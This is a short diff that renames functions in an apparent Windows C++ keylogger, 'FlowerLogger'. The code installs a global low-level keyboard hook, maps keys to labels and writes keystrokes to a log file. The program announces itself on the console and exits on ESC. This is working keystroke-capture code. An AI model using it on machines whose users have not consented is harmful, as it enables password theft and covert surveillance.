@@ -50,7 +50,7 @@ std::map<DWORD, std::string> keyMap = {
     {VK_ESCAPE, "[EXITING...]"}
 };
 
-LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+LRESULT CALLBACK FlowerKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0) {
         KBDLLHOOKSTRUCT* keyInfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
         DWORD key = keyInfo->vkCode;
@@ -77,21 +77,21 @@ LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 HHOOK hHook;
 
-void setKeyboardHook() {
-    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0);
+void FlowerSetKeyboardHook() {
+    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, FlowerKeyboardProc, NULL, 0);
     if (hHook == NULL) {
         std::cerr << "Failed to install hook!" << std::endl;
         exit(1);
     }
 }
 
-void startLogging() {
+void FlowerStartLogging() {
     FlowerLogging();
-    setKeyboardHook();
+    FlowerSetKeyboardHook();
     std::cout << "FlowerLogger started | [ESC] to exit." << std::endl;
 }
 
-void stopLogging() {
+void FlowerStopLogging() {
     if (logFile.is_open()) {
         logFile.close();
     }
@@ -99,12 +99,12 @@ void stopLogging() {
 }
 
 int main() {
-    startLogging();
+    FlowerStartLogging();
     MSG msg;
     while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
-    stopLogging();
+    FlowerStopLogging();
     return 0;
 }
